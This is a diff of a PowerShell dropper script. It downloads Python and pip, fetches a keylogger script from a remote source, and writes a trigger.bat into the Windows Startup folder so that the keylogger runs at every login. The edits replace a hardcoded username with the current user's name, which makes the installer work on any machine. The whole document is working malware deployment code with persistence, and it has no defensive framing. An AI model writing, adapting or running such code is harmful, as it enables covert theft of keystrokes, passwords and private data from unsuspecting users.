@@ -24,7 +24,7 @@ $destination4pip = "C:\Users\$user\Downloads\get-pip.py";
 Invoke-WebRequest -Uri $pipdownloadurl -OutFile $destination4pip;
 
 
-C:\Users\oleg_\Downloads\test\python.exe $destination4pip
+"C:\Users\$user\Downloads\test\python.exe" $destination4pip
 
 
 #Getting inside the python folder
@@ -62,9 +62,10 @@ Invoke-WebRequest -Uri $sourceKeyLogger -OutFile $destination4keylogger;
 
 # Creating trigger file on startup for keylogger
 
-New-Item "C:\Users\oleg_\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\trigger.bat";
+New-Item "C:\Users\$user\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\trigger.bat";
 
-Set-Content "C:\Users\oleg_\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\trigger.bat" 'start powershell "$user = [System.Environment]::UserName; powershell -c C:\Users\$user\Downloads\test\python.exe C:\Users\$user\Downloads\keyloggerscript.py" ';
+Set-Content "C:\Users\$user\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\trigger.bat" 'start powershell "$user = [System.Environment]::UserName; powershell -c C:\Users\$user\Downloads\test\python.exe C:\Users\$user\Downloads\keyloggerscript.py" ';
+
 
 
 # Running keylogger script
